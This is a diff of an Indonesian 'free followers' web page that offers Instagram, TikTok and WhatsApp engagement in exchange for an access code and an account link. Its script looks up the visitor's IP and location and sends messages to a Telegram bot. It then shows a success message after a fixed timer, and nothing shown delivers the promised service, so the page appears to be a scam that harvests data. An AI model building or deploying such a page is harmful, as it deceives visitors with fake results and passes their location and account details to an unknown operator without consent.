@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Free Followers Tools</title>
+  <title>Free Tools</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"/>
   <link href="https://fonts.googleapis.com/css?family=Titillium+Web:400,300,600" rel="stylesheet"/>
   <script src="https://unpkg.com/@lottiefiles/lottie-player@latest/dist/lottie-player.js"></script>
@@ -166,19 +166,20 @@
 </head>
 <body>
   <div class="login-page">
-    <div class="gradient-text">Free Followers</div>
+    <div class="gradient-text">Free Suntik</div>
     <center><button class="alurt-btn" id="alertBtn">Cara Kerja Layanan</button></center>
     <form id="loginForm" class="form">
       <lottie-player src="https://assets4.lottiefiles.com/packages/lf20_w51pcehl.json" background="transparent" speed="1" style="height: 180px;" loop autoplay></lottie-player>
       <input type="text" id="code" placeholder="Masukkan Kode Akses" required />
-      <input type="text" id="messege" placeholder="Contoh: @freefollowers" required />
+      <input type="text" id="messege" placeholder="Masukkan Link Akun" required />
       <select id="select" required>
         <option value="" disabled selected>Pilih Layanan</option>
         <option value="Instagram Followers">Instagram Followers</option>
         <option value="Instagram Likes">Instagram Likes</option>
         <option value="Instagram Views">Instagram Views</option>
-        <option value="WhatsApp Channel">WhatsApp Channel Use Link</option>
+        <option value="WhatsApp Channel">WhatsApp Channel</option>
         <option value="TikTok Followers">TikTok Followers</option>
+        <option value="TikTok Likes">TikTok Views</option>
         <option value="TikTok Likes">TikTok Likes</option>
         <option value="TikTok Favorit">TikTok Favorit</option>
         <option value="TikTok Share">TikTok Share</option>
@@ -246,7 +247,7 @@
       e.preventDefault();
       document.getElementById('successAnimation').style.display = 'none';
       const code = document.getElementById('code').value;
-      if(code !== VALID_CODE) return showModal('Kode salah. Gunakan kode: freewebs', true);
+      if(code !== VALID_CODE) return showModal('Kode salah. Harap masukan kode dengan benar', true);
       const user = document.getElementById('messege').value;
       const service = document.getElementById('select').value;
       const ip = await fetchLocation();
@@ -258,9 +259,9 @@
           showModal(`${service} sedang diproses untuk ${user}.\nTunggu sebentar...`, false);
           setTimeout(async () => {
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(`Layanan ${service} selesai untuk ${user}`)}`);
-            showModal(`Followers berhasil dikirim ke ${user}!`, true);
+            showModal(`berhasil dikirim ke ${user}!, harap cek`, true);
             document.getElementById('successAnimation').style.display = 'flex';
-          }, 1500000);
+          }, 15000);
         } else showModal('Gagal mengirim permintaan. Silakan coba lagi.', true);
       } catch {
         showModal('Terjadi kesalahan. Periksa koneksi atau refresh halaman.', true);
